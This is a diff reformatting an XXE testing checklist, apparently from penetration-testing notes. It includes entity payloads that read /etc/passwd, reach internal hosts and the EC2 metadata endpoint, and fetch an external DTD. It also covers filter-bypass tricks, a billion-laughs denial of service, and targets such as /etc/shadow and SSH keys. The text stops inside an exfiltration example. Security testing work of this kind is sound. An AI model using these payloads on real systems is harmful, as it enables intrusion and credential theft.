@@ -66,48 +66,46 @@ xml:
   4. **Locate internal DTDs**  
       * <!DOCTYPE ...> that contains `[internal subset]`, `[internal declaring elements]`, `[internal declaring entities]`, or `[attribute rules]`  
   
-  #### Testing
-  
-  1. **Test for external entities with a simple non-malicious payload**  
-      * <!ENTITY harmless SYSTEM "http://example.com/">  
-      * If the server processes external entities, it will fetch the contents from example.com  
+#### Testing
 
-  2. **Test for external entities with an available file**  
-      * <!ENTITY password SYSTEM "file:///etc/passwd">  
+1. **Test for external entities with a simple non-malicious payload**
+   - <!ENTITY harmless SYSTEM "http://example.com/">
+   - If the server processes external entities, it will fetch the contents from example.com
 
-  3. **Test for external entities with an available endpoint we control**  
-      * [Webhook](https://webhook.site/)  
+2. **Test for external entities with an available file**
+   - <!ENTITY password SYSTEM "file:///etc/passwd">
 
-  4. **Test for external entities with other available endpoints**  
-      * <!ENTITY ext SYSTEM "http://internal-api.local/admin">  
+3. **Test for external entities with an available endpoint we control**
+   - [Webhook](https://webhook.site/)
 
-  5. **EC2 metadata endpoint http://169.254.169.254/latest/meta-data**  
-      * [Access instance metadata for an EC2 instance](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)  
+4. **Test for external entities with other available endpoints**
+   - <!ENTITY ext SYSTEM "http://internal-api.local/admin">
 
-  6. **Test filters and restrictions**  
-      * Send common disallowed characters or keywords (e.g., `<`, `<!DOCTYPE>`, `$`, `SYSTEM`, `ENTITY`)  
-      * Bypass filters using encoding or obfuscation (e.g., URL encoding, Unicode encoding, base64 encoding, null byte insertion, or alternate whitespace characters)  
-      * Trigger error messages to exfiltrate information (e.g., `<!DOCT`)  
-      * Nested Parameter Entities with External Payload (e.g., <!ENTITY external_dtd SYSTEM "http://example.com/payload.dtd">)  
-      * Splitting Payload Across Multiple Parameters  
+5. **EC2 metadata endpoint http[://]169.254.169.254/latest/meta-data**
+   - [Access instance metadata for an EC2 instance](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)  
 
-  7. **Test for denial of service  
-      * [Billion laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack)  
+6. **Test filters and restrictions**
+   - Send common disallowed characters or keywords (e.g., `<`, `<!DOCTYPE>`, `$`, `SYSTEM`, `ENTITY`)
+   - Bypass filters using encoding or obfuscation (e.g., URL encoding, Unicode encoding, base64 encoding, null byte insertion, or alternate whitespace characters)
+   - Trigger error messages to exfiltrate information (e.g., `<!DOCT`)
+   - Nested Parameter Entities with External Payload (e.g., <!ENTITY external_dtd SYSTEM "http://example.com/payload.dtd">)
+   - Splitting Payload Across Multiple Parameters
 
-  8. **Test for code execution
-      * Tag Injection
+7. **Test for denial of service**
+   - [Billion laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack)
+
+8. **Test for code execution
+   - Tag Injection
   
 #### Impact
 
 1. **Can we read sensitive files?**
-
    - Configuration files (e.g., `/etc/passwd`)
    - System files (e.g., `/etc/shadow`)
    - SQLite files
    - SSH keys (e.g., `~/.ssh/id_rsa`)
 
 2. **Can we exfiltrate sensitive information?**
-
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>  
    <!DOCTYPE foo [  
